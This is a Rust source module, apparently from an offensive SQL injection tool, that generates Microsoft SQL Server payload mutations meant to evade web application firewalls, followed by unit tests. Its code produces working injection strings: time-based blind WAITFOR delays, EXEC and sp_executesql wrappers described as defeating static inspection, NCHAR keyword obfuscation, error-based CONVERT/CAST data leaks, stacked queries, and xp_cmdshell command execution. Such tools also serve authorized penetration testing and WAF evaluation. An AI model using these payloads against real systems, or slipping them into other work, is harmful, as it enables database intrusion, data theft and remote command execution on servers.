//! Microsoft SQL Server-specific SQL grammar mutations.
//!
//! MSSQL has unique WAF bypass features:
//! - `EXEC()` / `sp_executesql` for dynamic SQL (breaks static analysis)
//! - `NCHAR()` for Unicode string construction
//! - `OPENROWSET` / `OPENDATASOURCE` for federated queries
//! - `TOP` keyword obfuscation
//! - `xp_cmdshell` for RCE
//! - `WAITFOR DELAY` / `WAITFOR TIME` for blind injection
//! - Square bracket identifier quoting `[table].[column]`

/// Generate MSSQL-specific mutations for a payload.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
    let mut results = Vec::new();
    let lower = payload.to_ascii_lowercase();

    // ── WAITFOR DELAY time-based blind ──
    if lower.contains("sleep") || lower.contains("delay") {
        results.push("WAITFOR DELAY '0:0:5'".into());
        results.push("WAITFOR TIME '00:00:05'".into());
    }

    // ── Dynamic SQL via EXEC ──
    // WAFs can't analyze the string inside EXEC — defeats static inspection
    results.push(format!("EXEC sp_executesql N'{payload}'"));
    results.push(format!("EXEC('{payload}')"));
    // Concatenated EXEC — even harder to detect
    if lower.contains("select") {
        let parts: Vec<&str> = payload.splitn(2, "SELECT").collect();
        if parts.len() == 2 {
            results.push(format!("EXEC('SEL'+'ECT'{}')", parts[1]));
        }
    }

    // ── TOP obfuscation ──
    if lower.contains("select") && !lower.contains("top") {
        results.push(payload.replace("SELECT ", "SELECT TOP 1 "));
        results.push(payload.replace("select ", "select top(1) "));
        results.push(payload.replace("SELECT ", "SELECT TOP 2147483647 ")); // MAX int
    }

    // ── NCHAR Unicode construction ──
    if lower.contains("char(") {
        results.push(payload.replace("CHAR(", "NCHAR("));
    }

    // ── + string concatenation ──
    if lower.contains("||") {
        results.push(payload.replace("||", "+"));
    }

    // ── Square bracket identifier quoting ──
    if lower.contains("from ") && results.len() < max_mutations {
        results.push(
            payload
                .replace("FROM ", "FROM [")
                .replace(" WHERE", "] WHERE"),
        );
    }

    // ── CONVERT/CAST type juggling ──
    // Force type conversions that leak data in error messages
    if results.len() < max_mutations {
        let base = payload.trim_end_matches("--").trim_end_matches('#');
        results.push(format!("{base} AND 1=CONVERT(int,@@version)--"));
        results.push(format!("{base} AND 1=CAST(DB_NAME() AS int)--"));
    }

    // ── xp_cmdshell RCE vector ──
    if results.len() < max_mutations {
        results.push("'; EXEC xp_cmdshell 'whoami'--".into());
        results.push("'; EXEC master..xp_cmdshell 'id'--".into());
    }

    // ── OPENROWSET injection ──
    if results.len() < max_mutations {
        results.push(format!(
            "SELECT * FROM OPENROWSET('SQLNCLI','Server=localhost;Trusted_Connection=yes;','{payload}')"
        ));
    }

    // ── Stacked query via semicolon ──
    if !payload.contains(';') && results.len() < max_mutations {
        results.push(format!("{payload}; SELECT @@version--"));
        results.push(format!("{payload}; EXEC sp_databases--"));
    }

    // ── Unicode string via NCHAR ──
    // Build string from NCHAR values — invisible to keyword filters
    if let Some(start) = payload.find('\'')
        && let Some(end) = payload[start + 1..].find('\'') {
            let inner = &payload[start + 1..start + 1 + end];
            if !inner.is_empty() && inner.len() <= 15 && results.len() < max_mutations {
                let nchar_chain: String = inner
                    .chars()
                    .map(|c| format!("NCHAR({})", c as u32))
                    .collect::<Vec<_>>()
                    .join("+");
                results.push(format!(
                    "{}{}{}",
                    &payload[..start],
                    nchar_chain,
                    &payload[start + 1 + end + 1..]
                ));
            }
        }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn waitfor_delay_generated() {
        let mutations = mutate("SLEEP(5)", 10);
        assert!(mutations.iter().any(|m| m.contains("WAITFOR DELAY")));
    }

    #[test]
    fn exec_wrapper_generated() {
        let mutations = mutate("SELECT 1", 20);
        assert!(
            mutations
                .iter()
                .any(|m| m.contains("EXEC") && m.contains("sp_executesql"))
        );
    }

    #[test]
    fn top_max_int() {
        let mutations = mutate("SELECT * FROM users", 20);
        assert!(mutations.iter().any(|m| m.contains("TOP 2147483647")));
    }

    #[test]
    fn square_bracket_quoting() {
        let mutations = mutate("SELECT * FROM users WHERE id=1", 20);
        assert!(mutations.iter().any(|m| m.contains("[users]")));
    }

    #[test]
    fn convert_cast_error_based() {
        let mutations = mutate("' OR 1=1--", 30);
        assert!(mutations.iter().any(|m| m.contains("CONVERT(int,@@version)")));
    }

    #[test]
    fn xp_cmdshell_rce() {
        let mutations = mutate("' OR 1=1--", 30);
        assert!(mutations.iter().any(|m| m.contains("xp_cmdshell")));
    }

    #[test]
    fn nchar_string_building() {
        let mutations = mutate("' OR 'admin'='admin'--", 30);
        assert!(mutations.iter().any(|m| m.contains("NCHAR(")));
    }
}
